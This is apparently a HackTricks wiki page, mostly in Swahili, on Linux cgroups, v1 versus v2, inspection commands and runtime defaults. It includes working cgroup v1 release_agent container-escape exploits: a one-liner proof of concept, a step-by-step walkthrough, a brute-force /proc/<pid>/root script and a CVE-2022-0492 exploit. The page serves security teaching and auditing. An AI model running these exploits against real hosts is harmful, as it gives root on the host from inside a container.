# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Muhtasari

Linux **control groups** ni mekanismo ya kernel inayotumika kuunganisha michakato pamoja kwa ajili ya uhasibu, kupunguza, kipaumbele, na utekelezaji wa sera. Ikiwa namespaces zinahusu zaidi kutenganisha mtazamo wa rasilimali, cgroups zinafaidika zaidi katika kudhibiti **ni kiasi gani** cha rasilimali hizo seti ya michakato inaweza kutumia na, katika baadhi ya kesi, **ni aina gani za rasilimali** wanazoweza kuingiliana nazo kabisa. Containers zinategemea cgroups kila wakati, hata pale mtumiaji asipotazama moja kwa moja, kwa sababu karibu kila runtime ya kisasa inahitaji njia ya kumwambia kernel "michakato hii inamilikiwa na workload hii, na hizi ndizo sheria za rasilimali zinazowahusu".

Hivyo ndiyo sababu engines za container huweka container mpya katika cgroup subtree yake mwenyewe. Mara mti wa michakato uko huko, runtime inaweza kuweka kikomo cha memory, kupunguza idadi ya PIDs, kuipa uzito matumizi ya CPU, kudhibiti I/O, na kuzuia ufikivu wa vifaa. Katika mazingira ya uzalishaji, hili ni muhimu kwa usalama wa multi-tenant na kwa usafi wa uendeshaji wa kawaida. Container bila udhibiti mzuri wa rasilimali inaweza kumaliza memory, kuzidisha mfumo kwa michakato mingi, au kujiwekea monopo kwenye CPU na I/O kwa njia zinazoifanya host au workloads jirani kuwa tete.

Kwa mtazamo wa usalama, cgroups ni muhimu kwa njia mbili tofauti. Kwanza, vizingiti vibaya au vinavyokosekana vya rasilimali vinawezesha mashambulizi ya denial-of-service kwa urahisi. Pili, baadhi ya vipengele vya cgroup, hasa katika usanidi wa zamani wa **cgroup v1**, kihistoria vimeunda breakout primitives zenye nguvu wakati zilikuwa zinaweza kuandikwa kutoka ndani ya container.

## v1 Vs v2

Kuna miundo miwili kuu ya cgroup inayotumika. **cgroup v1** inaonyesha hierarchies nyingi za controller, na maelezo ya exploits ya zamani mara nyingi yanazunguka semantiki zisizo za kawaida na wakati mwingine zenye nguvu kupita kiasi zinazopatikana huko. **cgroup v2** inaleta hierarchy iliyounganishwa zaidi na mwenendo safi kwa ujumla. Matoleo ya kisasa ya Linux yanazidi kupendelea cgroup v2, lakini mazingira mchanganyiko au ya urithi bado yapo, ambayo ina maana kwamba miundo yote miwili bado ni muhimu wakati wa kukagua mifumo halisi.

Tofauti ina umuhimu kwa sababu baadhi ya hadithi maarufu za breakout za container, kama vile matumizi mabaya ya **`release_agent`** katika cgroup v1, zimeunganishwa sana na tabia za zamani za cgroup. Msomaji anayekiangalia exploit ya cgroup kwenye blogu kisha kuitumia bila kufikiri kwenye mfumo wa kisasa unaotumia tu cgroup v2 ana uwezekano mkubwa wa kuelewa vibaya kile kinachoweza kutendeka kwenye lengo.

## Ukaguzi

Njia ya haraka ya kuona ni wapi shell yako ya sasa iko ni:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
Faili `/proc/self/cgroup` inaonyesha njia za cgroup zinazohusiana na mchakato wa sasa. Kwenye host ya kisasa ya cgroup v2, mara nyingi utaona ingizo moja lililounganishwa. Kwenye host za zamani au za mchanganyiko, unaweza kuona njia nyingi za controller za v1. Mara utakapojua njia, unaweza kuchunguza mafaili yanayofanana chini ya `/sys/fs/cgroup` ili kuona mipaka na matumizi ya sasa.

Kwenye host ya cgroup v2, amri zifuatazo ni muhimu:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Faili hizi zinaonyesha ni controllers gani zipo na ni zipi zilizoteuliwa kwa child cgroups. Mfumo huu wa uteuzi ni muhimu katika mazingira ya rootless na yaliyoendeshwa na systemd, ambapo runtime inaweza kudhibiti tu sehemu ya utendaji ya cgroup ambayo hierarki ya mzazi kwa kweli imeiteua.

## Maabara

Njia moja ya kuona cgroups kwa vitendo ni kuendesha container yenye ukomo wa kumbukumbu:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Unaweza pia kujaribu PID-limited container:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
These examples are useful because they help connect the runtime flag to the kernel file interface. The runtime is not enforcing the rule by magic; it is writing the relevant cgroup settings and then letting the kernel enforce them against the process tree.

## Runtime Usage

Docker, Podman, containerd, and CRI-O all rely on cgroups as part of normal operation. The differences are usually not about whether they use cgroups, but about **which defaults they choose**, **how they interact with systemd**, **how rootless delegation works**, and **how much of the configuration is controlled at the engine level versus the orchestration level**.

In Kubernetes, resource requests and limits eventually become cgroup configuration on the node. The path from Pod YAML to kernel enforcement passes through the kubelet, the CRI runtime, and the OCI runtime, but cgroups are still the kernel mechanism that finally applies the rule. In Incus/LXC environments, cgroups are also heavily used, especially because system containers often expose a richer process tree and more VM-like operational expectations.

## Misconfigurations And Breakouts

The classic cgroup security story is the writable **cgroup v1 `release_agent`** mechanism. In that model, if an attacker could write to the right cgroup files, enable `notify_on_release`, and control the path stored in `release_agent`, the kernel could end up executing an attacker-chosen path in the initial namespaces on the host when the cgroup became empty. That is why older writeups place so much attention on cgroup controller writability, mount options, and namespace/capability conditions.

Even when `release_agent` is not available, cgroup mistakes still matter. Overly broad device access can make host devices reachable from the container. Missing memory and PID limits can turn a simple code execution into a host DoS. Weak cgroup delegation in rootless scenarios can also mislead defenders into assuming a restriction exists when the runtime was never actually able to apply it.

### `release_agent` Background

The `release_agent` technique only applies to **cgroup v1**. The basic idea is that when the last process in a cgroup exits and `notify_on_release=1` is set, the kernel executes the program whose path is stored in `release_agent`. That execution happens in the **initial namespaces on the host**, which is what turns a writable `release_agent` into a container escape primitive.

For the technique to work, the attacker generally needs:

- a writable **cgroup v1** hierarchy
- the ability to create or use a child cgroup
- the ability to set `notify_on_release`
- the ability to write a path into `release_agent`
- a path that resolves to an executable from the host point of view

### Classic PoC

The historical one-liner PoC is:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
PoC hii inaandika njia ya payload ndani ya `release_agent`, inasababisha uachishaji wa cgroup, na kisha inasoma tena faili ya pato iliyotengenezwa kwenye host.

### Maelezo ya Hatua kwa Hatua

Wazo lilelile linaeleweka kwa urahisi linapogawanywa katika hatua.

1. Unda na uandae cgroup inayoweza kuandikwa:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Tambua host path inayolingana na container filesystem:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Weka payload itakayoweza kuonekana kutoka kwenye njia ya mwenyeji:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Chochea utekelezaji kwa kufanya cgroup kuwa tupu:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
Athari ni utekelezaji upande wa mwenyeji wa payload kwa ruhusa za root za mwenyeji. Katika exploit halisi, payload kawaida huandika faili ya ushahidi, huanzisha reverse shell, au hubadilisha hali ya mwenyeji.

### Variant ya Relative Path Kutumia `/proc/<pid>/root`

Kwenye mazingira mengine, njia ya mwenyeji kuelekea filesystem ya container si dhahiri au imefichwa na driver wa uhifadhi. Katika hali hiyo njia ya payload inaweza kuonyeshwa kupitia `/proc/<pid>/root/...`, ambapo `<pid>` ni PID ya mwenyeji inayomilikiwa na mchakato katika container ya sasa. Hii ndio msingi wa toleo la brute-force la relative-path:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Mbinu muhimu hapa si brute force yenyewe bali muundo wa path: `/proc/<pid>/root/...` inaiwezesha kernel kutatua faili ndani ya container filesystem kutoka host namespace, hata wakati direct host storage path haijulikani mapema.

### CVE-2022-0492 Variant

Mwaka 2022, CVE-2022-0492 ilionyesha kwamba kuandika kwa `release_agent` katika cgroup v1 hakukuwa ukikagua ipasavyo kwa ajili ya `CAP_SYS_ADMIN` katika **initial** user namespace. Hii ilifanya technique hii iwe rahisi kufikiwa zaidi kwenye vulnerable kernels kwa sababu container process iliyoweza mount cgroup hierarchy iliweza kuandika `release_agent` bila kuwa tayari privileged katika host user namespace.

Minimal exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Katika kernel yenye udhaifu, host hufanya `/proc/self/exe` kwa vibali vya root za host.

Kwa matumizi ya vitendo, anza kwa kuangalia ikiwa mazingira bado yanaonyesha njia za cgroup-v1 zinazoweza kuandikwa au ufikiaji wa kifaa hatari:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Ikiwa `release_agent` ipo na inaweza kuandikwa, tayari uko katika eneo la legacy-breakout:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Ikiwa njia ya cgroup yenyewe haisababisha escape, matumizi yanayofuata ya vitendo mara nyingi huwa denial of service au reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Hizi amri zinaonyesha kwa haraka ikiwa workload ina nafasi ya kufanya fork-bomb, kutumia kumbukumbu kwa ukali, au kuutumia vibaya kiolesura cha zamani cha cgroup kinachoweza kuandikwa.

## Checks

Wakati unapotathmini lengo, kusudi la cgroup checks ni kujifunza ni modeli gani ya cgroup inayotumika, ikiwa container inaona writable controller paths, na ikiwa breakout primitives za zamani kama `release_agent` zinaweza hata kuwa muhimu.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Kinachovutia hapa:

- Ikiwa `mount | grep cgroup` inaonyesha **cgroup v1**, breakout writeups za zamani zinakuwa muhimu zaidi.
- Ikiwa `release_agent` ipo na inafikika, hiyo inastahili uchunguzi wa kina mara moja.
- Ikiwa hieraki ya cgroup inayonekana inaweza kuandikwa na container pia ina capabilities kali, mazingira yanastahili mapitio ya karibu zaidi.

Ikiwa ugundue **cgroup v1**, writable controller mounts, na container ambayo pia ina capabilities kali au ulinzi dhaifu wa seccomp/AppArmor, mchanganyiko huo unastahili umakini makini. cgroups mara nyingi hutendewa kama mada ya kuchosha ya usimamizi wa rasilimali, lakini kihistoria imekuwa sehemu ya baadhi ya container escape chains zinazofundisha zaidi hasa kwa sababu mpaka kati ya "resource control" na "host influence" haukuwa safi kama watu walidhani.

## Mipangilio chaguo-msingi ya Runtime

| Runtime / platform | Hali ya chaguo-msingi | Tabia ya chaguo-msingi | Udhoofishaji wa kawaida (kwa mkono) |
| --- | --- | --- | --- |
| Docker Engine | Imewezeshwa chaguo-msingi | Containers zinawekwa katika cgroups kiotomatiki; mipaka ya rasilimali ni hiari isipokuwa imewekwa kwa flags | omitting `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Imewezeshwa chaguo-msingi | `--cgroups=enabled` ni default; cgroup namespace defaults zinatofautiana kwa toleo la cgroup (`private` on cgroup v2, `host` on some cgroup v1 setups) | `--cgroups=disabled`, `--cgroupns=host`, upatikanaji wa device uliorahisishwa, `--privileged` |
| Kubernetes | Imewezeshwa kupitia runtime chaguo-msingi | Pods na containers zimewekwa katika cgroups na runtime ya node; udhibiti wa rasilimali kwa undani hutegemea `resources.requests` / `resources.limits` | kutojumuisha resource requests/limits, ufikiaji wa device uliopewa ruhusa za juu, misconfiguration ya runtime ngazi ya host |
| containerd / CRI-O | Imewezeshwa chaguo-msingi | cgroups ni sehemu ya usimamizi wa lifecycle wa kawaida | runtime configs za moja kwa moja zinazopunguza udhibiti wa device au kufunua writable cgroup v1 interfaces |

Tofauti muhimu ni kwamba **uwepo wa cgroup** kawaida ni chaguo-msingi, wakati **vikwazo vinavyotumika vya rasilimali** mara nyingi ni hiari isipokuwa vimewekwa kwa uwazi.
{{#include ../../../../banners/hacktricks-training.md}}
